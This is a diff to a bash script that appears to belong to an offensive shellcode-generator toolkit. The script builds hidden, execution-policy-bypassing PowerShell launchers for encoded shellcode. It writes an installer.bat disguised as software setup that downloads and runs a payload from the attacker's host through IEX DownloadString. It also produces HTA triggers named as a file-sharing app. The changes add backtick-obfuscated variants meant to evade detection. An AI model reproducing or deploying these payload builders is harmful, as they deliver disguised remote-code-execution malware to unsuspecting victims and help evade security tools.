@@ -3580,6 +3580,10 @@ cd $IPATH/output/
 # compiling to ps1 output format
 echo "[☠] Injecting shellcode -> $N4m.ps1!"
 sleep 2
+#
+# https://artofpwn.com/offensive-and-defensive-powershell-ii.html
+# TODO: echo "powershell.exe -nop -wind \`h\`id\`d\`en -Exec \`B\`yp\`a\`ss -noni -enc Sh33L" > payload.raw
+#
 echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
 sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
 rm $IPATH/output/payload.raw > /dev/null 2>&1
@@ -3595,6 +3599,7 @@ echo ":: ---" >> $IPATH/output/installer.bat
 echo "@echo off" >> $IPATH/output/installer.bat
 echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/installer.bat
 echo "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" >> $IPATH/output/installer.bat
+
 
 
 
@@ -10013,13 +10018,13 @@ paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable 
 # input payload name
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 # input payload (agent) remote upload directory
-D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agente.\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
+D1r=$(zenity --title="☠ Enter remote upload dir ☠" --text "The remote directory where to upload agent.\nWARNING:Use only Windows Enviroment Variables\n\nexample: %tmp%" --entry --width 330) > /dev/null 2>&1
 
 #
 # check if remote path was inputed correctlly (only enviroment variables accepted)
 #
 chec=`echo "$D1r" | grep "%"`
-# verify if '$chec' local var contains the '%' string (enviroment variables)
+# verify if '$chec' local var contains the '%' string (enviroment variable)
 if [ -z "$chec" ]; then
   echo "[x] WARNING: remote directory not supported .."
   echo "[✔] Setting remote upload directory to: %tmp%"
@@ -10097,10 +10102,11 @@ sleep 1
 echo "[☠] Injecting shellcode into $N4m.bat!"
 sleep 2
 echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m.bat
-echo ":: unicorn - reproduction (base64 encoded)" >> $N4m.bat
+# echo ":: Using \` psh escape caracter to ofuscate syscall " >> $N4m.bat
 echo ":: ---" >> $N4m.bat
 echo "@echo off" >> $N4m.bat
-echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
+# echo "powershell.exe -nop -wind \`h\`id\`den -Exec \`By\`pa\`ss -noni -enc $disp" >> $N4m.bat
+echo "cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
 echo "exit" >> $N4m.bat
 chmod +x $IPATH/output/$N4m.bat
 N4m="$N4m.bat"
@@ -10149,12 +10155,12 @@ cd $IPATH/templates
 echo "[☠] Building trigger.hta script .."
 sleep 2
 if [ "$chose" = "Build venom agent.bat" ]; then
-  sed "s|IpAdR|$IP|" template.hta > trigger.hta
+  sed "s|IpAdR|$lhost|" template.hta > trigger.hta
   sed -i "s/NoMe/$N4m/g" trigger.hta
   sed -i "s/RdI/$D1r/g" trigger.hta
   mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
 else
-  sed "s|IpAdR|$IP|" template_exe.hta > trigger.hta
+  sed "s|IpAdR|$lhost|" template_exe.hta > trigger.hta
   sed -i "s/NoMe/$N4m/g" trigger.hta
   sed -i "s/RdI/$D1r/g" trigger.hta
   mv trigger.hta $IPATH/output/EasyFileSharing.hta > /dev/null 2>&1
